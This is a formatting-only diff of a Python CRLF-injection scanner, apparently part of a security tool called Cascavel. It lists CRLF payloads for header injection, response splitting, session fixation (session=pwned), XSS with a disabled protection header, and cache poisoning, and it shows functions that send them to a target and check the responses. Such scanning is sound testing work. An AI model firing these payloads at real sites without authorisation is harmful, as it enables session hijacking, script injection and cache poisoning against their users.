@@ -31,7 +31,10 @@ PAYLOADS = [
     ("%0d%0aInjected-Header:CascavelTest", "CRLF_BASIC"),
     ("%0d%0a%0d%0a<html>CRLFTest</html>", "RESPONSE_SPLITTING"),
     ("%0d%0aSet-Cookie:session=pwned;Path=/", "SESSION_FIXATION"),
-    ("%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<script>alert(1)</script>", "XSS_PROTECTION_DISABLE"),
+    (
+        "%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<script>alert(1)</script>",
+        "XSS_PROTECTION_DISABLE",
+    ),
     ("%0d%0aCache-Control:public,max-age=31536000%0d%0a%0d%0aPOISONED", "CACHE_POISON"),
     ("%0d%0aContent-Type:text/html%0d%0a%0d%0a<h1>CRLF</h1>", "CONTENT_TYPE_OVERRIDE"),
     ("%E5%98%8A%E5%98%8DInjected:UnicodeCRLF", "UNICODE_BYPASS"),
@@ -68,9 +71,17 @@ def _verify_waf_blind_reflection(target, header_name):
     """Verifica se o WAF/Proxy reflete cabeçalhos desconhecidos cegamente."""
     junk_value = "cascavel_blind_reflection_test_12345"
     try:
-        resp = requests.get(f"http://{target}/", headers={header_name: junk_value}, timeout=6, allow_redirects=False)
+        resp = requests.get(
+            f"http://{target}/",
+            headers={header_name: junk_value},
+            timeout=6,
+            allow_redirects=False,
+        )
         resp_headers_str = str(resp.headers).lower()
-        if junk_value.lower() in resp.text.lower() or junk_value.lower() in resp_headers_str:
+        if (
+            junk_value.lower() in resp.text.lower()
+            or junk_value.lower() in resp_headers_str
+        ):
             return True
         return False
     except Exception:
@@ -84,7 +95,10 @@ def _verify_waf_blind_reflection_param(target, param):
     try:
         resp = requests.get(url, timeout=6, allow_redirects=False)
         resp_headers_str = str(resp.headers).lower()
-        if junk_value.lower() in resp.text.lower() or junk_value.lower() in resp_headers_str:
+        if (
+            junk_value.lower() in resp.text.lower()
+            or junk_value.lower() in resp_headers_str
+        ):
             return True
         return False
     except Exception:
@@ -94,7 +108,9 @@ def _verify_waf_blind_reflection_param(target, param):
 def _get_baseline_response(url, headers=None):
     """Captura a resposta base de uma requisição benigna para diffing."""
     try:
-        resp = requests.get(url, headers=headers or {}, timeout=6, allow_redirects=False)
+        resp = requests.get(
+            url, headers=headers or {}, timeout=6, allow_redirects=False
+        )
         return resp.text, resp.headers
     except Exception:
         return "", {}
@@ -145,8 +161,12 @@ def _test_crlf_header(target, payload, method):
             continue
 
         try:
-            resp = requests.get(f"http://{target}/", headers={header_name: header_val}, timeout=6)
-            found = _analyze_response(resp, f"header:{header_name}", method, baseline_text, baseline_headers)
+            resp = requests.get(
+                f"http://{target}/", headers={header_name: header_val}, timeout=6
+            )
+            found = _analyze_response(
+                resp, f"header:{header_name}", method, baseline_text, baseline_headers
+            )
             vulns.extend(found)
             if found:
                 break
@@ -169,15 +189,23 @@ def _test_crlf_path(target, payload, method):
         .replace("%250d", "")
         .replace("%250a", "")
     )
-    baseline_text, baseline_headers = _get_baseline_response(f"http://{target}/{payload_no_crlf}")
+    baseline_text, baseline_headers = _get_baseline_response(
+        f"http://{target}/{payload_no_crlf}"
+    )
     try:
-        resp = requests.get(f"http://{target}/{payload}", timeout=6, allow_redirects=False)
-        return _analyze_response(resp, "URL_PATH", method, baseline_text, baseline_headers)
+        resp = requests.get(
+            f"http://{target}/{payload}", timeout=6, allow_redirects=False
+        )
+        return _analyze_response(
+            resp, "URL_PATH", method, baseline_text, baseline_headers
+        )
     except Exception:
         return []
 
 
-def _analyze_response(resp, injection_point, method, baseline_text="", baseline_headers=None):
+def _analyze_response(
+    resp, injection_point, method, baseline_text="", baseline_headers=None
+):
     """Analisa resposta para sinais de CRLF injection."""
     if baseline_headers is None:
         baseline_headers = {}
@@ -188,7 +216,9 @@ def _analyze_response(resp, injection_point, method, baseline_text="", baseline_
         h_low = h_name.lower()
         v_low = h_val.lower()
         b_val = baseline_headers.get(h_name, "").lower()
-        if ("injected" in h_low or "cascaveltest" in v_low or "unicodecrlf" in v_low) and v_low != b_val:
+        if (
+            "injected" in h_low or "cascaveltest" in v_low or "unicodecrlf" in v_low
+        ) and v_low != b_val:
             sev = "CRITICO" if method in CRITICO_METHODS else "ALTO"
             vulns.append(
                 {
@@ -220,7 +250,10 @@ def _analyze_response(resp, injection_point, method, baseline_text="", baseline_
     # Check cookie injection
     for cookie_header in resp.headers.get("Set-Cookie", "").split(","):
         b_cookies = baseline_headers.get("Set-Cookie", "").lower()
-        if "session=pwned" in cookie_header.lower() and "session=pwned" not in b_cookies:
+        if (
+            "session=pwned" in cookie_header.lower()
+            and "session=pwned" not in b_cookies
+        ):
             vulns.append(
                 {
                     "tipo": "CRLF_COOKIE_INJECTION",
